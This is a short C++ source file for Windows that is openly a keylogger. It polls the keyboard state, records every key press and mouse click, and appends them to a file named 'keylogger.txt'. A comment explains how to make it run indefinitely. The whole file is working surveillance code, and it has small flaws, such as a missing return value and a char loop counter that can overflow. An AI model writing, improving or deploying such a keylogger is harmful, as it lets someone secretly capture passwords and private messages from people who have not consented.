#include <Windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <stdio.h>

using namespace std;

void write_log( string text ){
    ofstream logfile;
    logfile.open("keylogger.txt", fstream::app);
    logfile << text;
    logfile.close();
}

bool key_listed(int iKey){
    switch (iKey){
        case VK_SPACE:
            cout << " ";
            write_log(" ");
            break;
        case VK_SHIFT:
            cout << " *SHIFT* ";
            write_log(" *SHIFT* ");
            break;
        case VK_RETURN:
            cout << " \n ";
            write_log(" \n ");
            break;
        case VK_BACK:
            cout << " *BACKSPACE* ";
            write_log(" *BACKSPACE* ");
            break;
        case VK_RBUTTON:
            cout << " *RIGHT CLICK* ";
            write_log(" *RIGHT CLICK* ");
            break;
        case VK_LBUTTON:
            cout << " *LEFT CLICK* ";
            write_log(" *LEFT CLICK* ");
            break;
        default:
            return false;
    }
}

int main()
{
    char key;
    int i=0;
    while (i<100){  //can be executed indefinitely by using while(true)
        Sleep(10);
        for(key=1; key<=128;key++){
            if (GetAsyncKeyState(key) == -32767){  //the key is used and is not up
                if (!key_listed(key)){
                    if (key>=32 && key<=128){
                        ofstream logfile;
                        logfile.open("keylogger.txt", fstream::app);
                        cout << key ;
                        logfile << key ;
                        logfile.close();
                    }
                }
            }
        }
        i+=1;   
    }
    return 0;
} 